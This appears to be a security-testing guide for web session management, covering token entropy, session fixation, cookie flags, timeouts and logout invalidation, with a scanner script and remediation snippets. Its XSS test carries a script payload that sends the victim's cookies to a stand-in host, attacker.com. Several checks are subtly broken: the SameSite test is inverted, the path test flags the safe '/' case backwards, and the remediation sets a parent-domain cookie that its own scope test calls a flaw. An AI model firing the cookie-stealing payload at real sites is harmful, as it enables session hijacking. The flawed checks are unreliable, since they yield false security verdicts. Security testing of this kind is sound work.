---
name: session_management
description: Session fixation, hijacking, token security, and session management testing
---

# Session Management Testing

## Overview
Session management vulnerabilities allow attackers to steal or manipulate user sessions. Testing must cover session fixation, hijacking, token security, and session handling.

## Testing Methodology

### 1. Session Token Analysis

#### Token Entropy Analysis
```python
import math
from collections import Counter

def analyze_token_entropy(token: str) -> float:
    """Calculate Shannon entropy of a token"""
    if not token:
        return 0.0
    
    counter = Counter(token)
    length = len(token)
    
    entropy = 0.0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def analyze_token_quality(token: str) -> dict:
    """Analyze token quality"""
    return {
        "length": len(token),
        "entropy": analyze_token_entropy(token),
        "unique_chars": len(set(token)),
        "has_uppercase": any(c.isupper() for c in token),
        "has_lowercase": any(c.islower() for c in token),
        "has_digits": any(c.isdigit() for c in token),
        "has_special": any(not c.isalnum() for c in token),
    }
```

#### Predictability Testing
```python
async def test_token_predictability(session, login_url):
    """Test if session tokens are predictable"""
    tokens = []
    
    # Generate multiple tokens
    for i in range(100):
        response = await session.post(login_url, json={
            "email": f"test{i}@example.com",
            "password": "password123"
        })
        
        if "token" in response.json():
            tokens.append(response.json()["token"])
    
    # Analyze patterns
    if len(set(tokens)) < len(tokens):
        return {"predictable": True, "unique_tokens": len(set(tokens))}
    
    # Check for sequential patterns
    for i in range(len(tokens) - 1):
        if tokens[i+1].startswith(tokens[i][:8]):
            return {"predictable": True, "pattern": "sequential"}
    
    return {"predictable": False}
```

### 2. Session Fixation Testing

#### Pre-Session Token Test
```python
async def test_session_fixation(session, login_url):
    """Test for session fixation vulnerability"""
    # Get session token before login
    response1 = await session.get(login_url)
    token_before = extract_token(response1)
    
    # Login
    await session.post(login_url, json={
        "email": "user@example.com",
        "password": "password123"
    })
    
    # Get session token after login
    response2 = await session.get(login_url)
    token_after = extract_token(response2)
    
    # If token didn't change, session fixation exists
    return token_before == token_after
```

#### URL-Based Session Token
```python
async def test_url_session_token(session, base_url):
    """Test if session token is in URL"""
    # Check if token appears in URL
    response = await session.get(f"{base_url}?session_id=abc123")
    
    # Check response for token reflection
    content = await response.text()
    if "abc123" in content:
        return True
    
    return False
```

### 3. Session Hijacking Testing

#### Cross-Site Scripting (XSS) Cookie Theft
```python
async def test_xss_cookie_theft(session, vulnerable_url):
    """Test if XSS can steal session cookies"""
    # Inject payload that exfiltrates cookies
    payload = {
        "input": "<script>document.location='http://attacker.com/?c='+document.cookie</script>"
    }
    
    response = await session.post(vulnerable_url, json=payload)
    
    # Check if payload was reflected
    content = await response.text()
    if "document.cookie" in content:
        return True
    
    return False
```

#### Session Token in Headers
```python
async def test_session_header_leakage(session, api_url):
    """Test if session token leaks in headers"""
    response = await session.get(api_url)
    
    # Check for insecure headers
    headers = response.headers
    
    # Token should not be in these headers
    sensitive_headers = ["X-Session-Id", "X-Auth-Token", "Authorization"]
    
    for header in sensitive_headers:
        if header in headers:
            return {"leaked": True, "header": header}
    
    return {"leaked": False}
```

### 4. Cookie Security Testing

#### Secure Flag Testing
```python
async def test_cookie_flags(session, login_url):
    """Test cookie security flags"""
    response = await session.post(login_url, json={
        "email": "user@example.com",
        "password": "password123"
    })
    
    cookies = response.cookies
    issues = []
    
    for cookie in cookies:
        if not cookie.secure:
            issues.append(f"Cookie '{cookie.name}' missing Secure flag")
        
        if not cookie.has_nonstandard_attr("HttpOnly"):
            issues.append(f"Cookie '{cookie.name}' missing HttpOnly flag")
        
        if cookie.has_nonstandard_attr("SameSite"):
            issues.append(f"Cookie '{cookie.name}' missing SameSite attribute")
    
    return issues
```

#### Cookie Scope Testing
```python
async def test_cookie_scope(session, base_url):
    """Test cookie scope (domain and path)"""
    response = await session.get(base_url)
    cookies = response.cookies
    
    issues = []
    
    for cookie in cookies:
        # Cookie should not be scoped to parent domain
        if cookie.domain and cookie.domain.startswith("."):
            issues.append(f"Cookie '{cookie.name}' scoped to parent domain")
        
        # Cookie should have restrictive path
        if cookie.path and cookie.path != "/":
            issues.append(f"Cookie '{cookie.name}' has broad path scope")
    
    return issues
```

### 5. Session Timeout Testing

#### Absolute Timeout
```python
async def test_absolute_timeout(session, protected_url, login_url):
    """Test if absolute session timeout is enforced"""
    # Login
    await session.post(login_url, json={
        "email": "user@example.com",
        "password": "password123"
    })
    
    # Wait for timeout (simulated)
    import asyncio
    await asyncio.sleep(3600)  # 1 hour
    
    # Try to access protected resource
    response = await session.get(protected_url)
    
    # Should be redirected to login
    return response.status in [302, 401]
```

#### Idle Timeout
```python
async def test_idle_timeout(session, protected_url, login_url):
    """Test if idle session timeout is enforced"""
    # Login
    await session.post(login_url, json={
        "email": "user@example.com",
        "password": "password123"
    })
    
    # Access resource (active)
    await session.get(protected_url)
    
    # Wait without activity (simulated)
    import asyncio
    await asyncio.sleep(1800)  # 30 minutes
    
    # Try to access protected resource
    response = await session.get(protected_url)
    
    # Should be redirected to login
    return response.status in [302, 401]
```

### 6. Session Invalidation Testing

#### Logout Testing
```python
async def test_logout_invalidation(session, logout_url, protected_url, login_url):
    """Test if session is invalidated on logout"""
    # Login
    await session.post(login_url, json={
        "email": "user@example.com",
        "password": "password123"
    })
    
    # Get token before logout
    token_before = extract_token(session.cookies)
    
    # Logout
    await session.post(logout_url)
    
    # Try to access protected resource with old token
    response = await session.get(protected_url, headers={
        "Authorization": f"Bearer {token_before}"
    })
    
    # Should be rejected
    return response.status in [401, 403]
```

#### Password Change Invalidation
```python
async def test_password_change_invalidation(session, change_url, protected_url, login_url):
    """Test if session is invalidated on password change"""
    # Login
    await session.post(login_url, json={
        "email": "user@example.com",
        "password": "oldpassword"
    })
    
    # Change password
    await session.post(change_url, json={
        "old_password": "oldpassword",
        "new_password": "newpassword"
    })
    
    # Try to access protected resource
    response = await session.get(protected_url)
    
    # Should be invalidated
    return response.status in [302, 401]
```

### 7. Tools & Scripts

#### Session Security Scanner
```python
#!/usr/bin/env python3
"""Session management security scanner"""
import asyncio
import aiohttp
import json
from typing import Dict, List, Any

class SessionScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings: List[Dict[str, Any]] = []
    
    async def test_session_fixation(self, session: aiohttp.ClientSession):
        """Test for session fixation"""
        login_url = f"{self.base_url}/login"
        
        # Get token before login
        async with session.get(login_url) as resp:
            token_before = resp.cookies.get("session_id")
        
        # Login
        async with session.post(login_url, json={
            "email": "test@example.com",
            "password": "password123"
        }) as resp:
            token_after = resp.cookies.get("session_id")
        
        if token_before and token_before == token_after:
            self.findings.append({
                "type": "SESSION_FIXATION",
                "severity": "HIGH",
                "description": "Session token not regenerated after login"
            })
            return True
        return False
    
    async def test_cookie_flags(self, session: aiohttp.ClientSession):
        """Test cookie security flags"""
        login_url = f"{self.base_url}/login"
        
        async with session.post(login_url, json={
            "email": "test@example.com",
            "password": "password123"
        }) as resp:
            for cookie in resp.cookies.values():
                if not cookie.get("secure"):
                    self.findings.append({
                        "type": "COOKIE_MISSING_SECURE",
                        "severity": "MEDIUM",
                        "description": f"Cookie '{cookie.name}' missing Secure flag"
                    })
                
                if not cookie.get("httponly"):
                    self.findings.append({
                        "type": "COOKIE_MISSING_HTTPONLY",
                        "severity": "MEDIUM",
                        "description": f"Cookie '{cookie.name}' missing HttpOnly flag"
                    })
    
    async def run_all_tests(self) -> List[Dict[str, Any]]:
        """Run all session security tests"""
        print("Starting session management scan...")
        
        async with aiohttp.ClientSession() as session:
            print("1. Testing session fixation...")
            await self.test_session_fixation(session)
            
            print("2. Testing cookie flags...")
            await self.test_cookie_flags(session)
        
        print(f"\nScan complete. Found {len(self.findings)} issues.")
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return self.findings

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python session_scanner.py <base_url>")
        sys.exit(1)
    
    scanner = SessionScanner(sys.argv[1])
    asyncio.run(scanner.run_all_tests())
```

### 8. Remediation Guidance

#### Session Token Regeneration
```python
# Regenerate session token after login
@app.route('/login', methods=['POST'])
def login():
    # Validate credentials
    if authenticate(request.json['email'], request.json['password']):
        # Regenerate session token
        session.regenerate()
        
        # Set session data
        session['user_id'] = user.id
        
        return jsonify({'success': True})
```

#### Cookie Security Flags
```python
# Set secure cookie flags
response.set_cookie(
    'session_id',
    session_id,
    httponly=True,      # Prevent XSS access
    secure=True,        # HTTPS only
    samesite='Lax',     # CSRF protection
    max_age=3600,       # 1 hour expiry
    domain='.example.com',
    path='/'
)
```

#### Session Timeout
```python
# Implement session timeout
@app.before_request
def check_session_timeout():
    if 'last_activity' in session:
        last_activity = datetime.fromisoformat(session['last_activity'])
        if datetime.now() - last_activity > timedelta(minutes=30):
            session.clear()
            return redirect('/login')
    
    session['last_activity'] = datetime.now().isoformat()
```

#### Session Invalidation
```python
# Invalidate session on logout
@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    response = jsonify({'success': True})
    response.delete_cookie('session_id')
    return response
```

## Validation Checklist

- [ ] Session tokens are high-entropy (128+ bits)
- [ ] Session tokens are regenerated after login
- [ ] Cookies have Secure flag
- [ ] Cookies have HttpOnly flag
- [ ] Cookies have SameSite attribute
- [ ] Session timeout is enforced (absolute and idle)
- [ ] Session is invalidated on logout
- [ ] Session is invalidated on password change
- [ ] Session tokens not in URLs
- [ ] Session tokens not logged
